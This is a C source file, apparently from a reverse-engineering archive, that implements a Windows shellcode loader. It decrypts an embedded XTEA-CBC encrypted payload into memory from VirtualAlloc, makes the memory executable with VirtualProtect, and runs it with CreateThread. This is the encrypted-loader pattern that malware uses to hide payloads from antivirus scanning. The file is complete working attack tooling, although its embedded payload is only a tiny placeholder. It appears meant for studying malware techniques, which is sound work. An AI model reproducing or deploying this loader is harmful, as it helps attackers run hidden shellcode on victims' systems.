/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    XTEA with CBC mode
    - permission: VirtualProtect
    - execution:  CreateThread

Reference:
    - https://github.com/ReversingID/Crypto-Reference/blob/master/Codes/Cipher/Block/XTEA/code.c
*/

#include <windows.h>
#include <stdint.h>
#include <stdlib.h>


#define BLOCKSIZEB      8
#define ROUNDS          32

#ifdef _MSC_VER
    #pragma intrinsic(_lrotr,_lrotl)
    #define rotr(x,n)   _lrotr(x,n)
    #define rotl(x,n)   _lrotl(x,n)
#else 
    #define rotr(x,n)   (((x) >> ((int)(n))) | ((x) << (32 - (int)(n))))
    #define rotl(x,n)   (((x) << ((int)(n))) | ((x) >> (32 - (int)(n))))
#endif

#define bswap32(x)      (rotl(x,8) & 0x00FF00FF | rotr(x, 8) & 0xFF00FF00)

#if !defined(LITTLE_ENDIAN) && !defined(BIG_ENDIAN)
    #ifdef _MSC_VER
        #define LITTLE_ENDIAN
    #elif defined(__BYTE_ORDER__) && (__BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__)
        #define LITTLE_ENDIAN 
    #elif defined(__BYTE_ORDER__) && (__BYTE_ORDER__ == __ORDER_BIG_ENDIAN__)
        #define BIG_ENDIAN
    #else 
        #define BIG_ENDIAN
    #endif
#endif

#ifdef LITTLE_ENDIAN
    #define convert(x)   bswap32(x)
#else
    #define convert(x)   (x)
#endif


/* *************************** HELPER FUNCTIONS *************************** */
void xor_block(uint8_t * dst, uint8_t * src1, uint8_t * src2)
{
    register uint32_t i = 0;
    for (i = 0; i < BLOCKSIZEB; i++)
        dst[i] = src1[i] ^ src2[i];
}


void block_decrypt (uint8_t * val, uint8_t * key)
{
    uint32_t  * p_val = (uint32_t*)val;
    uint32_t  * p_key = (uint32_t*)key;

    uint32_t    v0 = convert(p_val[0]), v1 = convert(p_val[1]);
    uint32_t    k0 = convert(p_key[0]), k1 = convert(p_key[1]), 
                k2 = convert(p_key[2]), k3 = convert(p_key[3]);
    uint32_t    delta = 0x9E3779B9, sum = 0xC6EF3720, i;

    // Round: 32
    for (i =  0; i < ROUNDS; i++)
    {
        // Inverse Round-Function
        v1  -= ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
        v0  -= ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        sum -= delta;
    }

    p_val[0] = convert(v0);
    p_val[1] = convert(v1);
}

void decrypt (uint8_t * data, uint32_t length, uint8_t * key, uint8_t * iv)
{
    uint32_t   i;
    uint8_t    prev_block[BLOCKSIZEB];
    uint8_t    ctext_block[BLOCKSIZEB];

    memcpy(prev_block, iv, BLOCKSIZEB);

    for (i = 0; i < length; i += BLOCKSIZEB)
    {
        // Simpan block ciphertext untuk operasi XOR berikutnya.
        memcpy(ctext_block, &data[i], BLOCKSIZEB);

        // Dekripsi ciphertext menjadi block
        block_decrypt(&data[i], key);

        // XOR block block dengan block ciphertext sebelumnya
        // gunakan IV bila ini adalah block pertama
        xor_block(&data[i], &data[i], prev_block);

        // Pindahkan block ciphertext yang telah disimpan
        memcpy(prev_block, ctext_block, BLOCKSIZEB);
    }
}


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 
        0xd2, 0x8a, 0x6c, 0x7e, 0x04, 0x06, 0xd5, 0x86, 
        0xd7, 0xbb, 0x01, 0x1d, 0x11, 0x83, 0x8c, 0xac 
    };
    uint32_t    payload_len = 8;
    uint8_t   * iv = &payload[payload_len];

    // secret-key
    uint8_t     key[] = 
            { 0x52, 0x45, 0x56, 0x45, 0x52, 0x53, 0x49, 0x4E, 0x47, 0x2E, 0x49, 0x44, 
    /* ASCII:   R     E     V     E     R     S     I     N     G     .     I     D  */
              0x31, 0x33, 0x33, 0x37 };
            /*  1     3     3     7  */

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decrypt data
    RtlMoveMemory (runtime, payload, payload_len);
    decrypt ((uint8_t*)runtime, payload_len, key, iv);
    
    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}